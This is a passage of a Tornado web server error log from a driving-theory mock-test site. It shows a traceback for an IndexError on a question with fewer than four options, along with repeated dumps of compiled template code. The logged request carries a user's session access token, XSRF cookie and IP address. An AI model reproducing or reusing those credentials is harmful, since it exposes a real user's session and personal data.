 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505f3a9d8e4c85480ff4f8d4&answers=%5B3%5D&cursor=6&_xsrf=ce7d9e810e464e19848ed72d59f4a783', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.100.29.65', 'Cookie': '_xsrf=ce7d9e810e464e19848ed72d59f4a783; access_token="QUFBRzZsTmNzNkdjQkFBOTU5SGowU2pxTTd6UlJIS1pCMTY5NHEyZEFBRTBNUHdpYjMzb3NqU3JFMzMyWVpBZlIzUlhFYnhBMzB0VDVlekJBR3ZiTW51YW4wbjdaQ1JxZWdZZWIwc1Mzd1pEWkQ=|1348415370|e77e7d22e9cf7bf4faf49878c52c82482f8e42a6"; __utma=188782963.1367876954.1348415328.1348415328.1348417904.2; __utmb=188782963.2.10.1348417904; __utmc=188782963; __utmz=188782963.1348415328.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 152.63ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
